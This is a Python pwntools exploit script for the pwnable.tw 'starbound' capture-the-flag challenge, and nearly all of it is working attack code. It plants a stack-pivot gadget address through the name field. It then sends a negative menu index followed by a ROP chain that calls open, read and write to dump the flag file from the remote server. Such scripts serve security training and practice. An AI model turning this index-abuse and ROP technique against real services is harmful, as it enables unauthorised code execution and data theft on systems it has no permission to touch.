#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./starbound"
libcPath = "./libc_32.so.6"
remoteAddr = "chall.pwnable.tw"
remotePort = 10202

context.log_level = "debug"
context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc
    fname = "./flag\0"

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath}, timeout = 2)
    else:
        io = remote(remoteAddr, remotePort, timeout = 2)
        context.log_level = "debug"
    if libcPath:
        libc = ELF(libcPath)
    fname = "/home/starbound/flag\0"

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def setName(name):
    io.sendlineafter("> ", "6")
    io.sendlineafter("> ", "2")
    io.sendafter(": ", name)
    io.sendlineafter("> ", "1")

if __name__ == "__main__":
    '''
    0x08048e48: add esp, 0x1c; ret;
    '''
    stackPivot = 0x8048e48
    setName(p32(stackPivot) * 2 + fname)
    #  DEBUG([0x804A65D])
    #  io.sendlineafter("> ", "-33 aaaabbbbccccddddeeeeffffgggg")
    '''
    0x080499ef : pop esi ; ret
    0x080499ee : pop ebx ; pop esi ; ret
    0x080494da : pop ebx ; pop esi ; pop edi ; ret
    '''
    pr = 0x80499ef
    ppr = 0x80499ee
    pppr = 0x80494da
    faddr = 0x80580d8
    payload = flat(["-33 aaaa", elf.plt['open'], ppr, faddr, 0, elf.plt['read'], pppr, 3, elf.bss() + 0x500, 0x100, elf.plt['write'], 0xdeadbeef, 1, elf.bss() + 0x500, 0x100])
    assert len(payload) < 0x100
    io.sendlineafter("> ", payload)

    io.interactive()
